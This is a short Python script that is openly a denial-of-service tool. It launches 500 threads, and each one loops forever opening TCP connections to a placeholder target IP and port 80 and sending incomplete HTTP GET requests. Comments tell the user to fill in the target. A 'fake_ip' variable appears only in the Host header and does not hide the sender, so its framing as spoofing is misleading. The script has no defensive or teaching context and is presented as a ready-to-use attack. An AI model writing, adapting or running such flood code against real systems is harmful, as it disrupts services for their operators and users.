import socket
import threading

# Target information
target_ip = "192.168.1.1"  # Replace with the target IP
target_port = 80          # Replace with the target port
fake_ip = "10.10.10.10"   # Replace with a fake IP address

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
        s.close()

# Start multiple threads
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
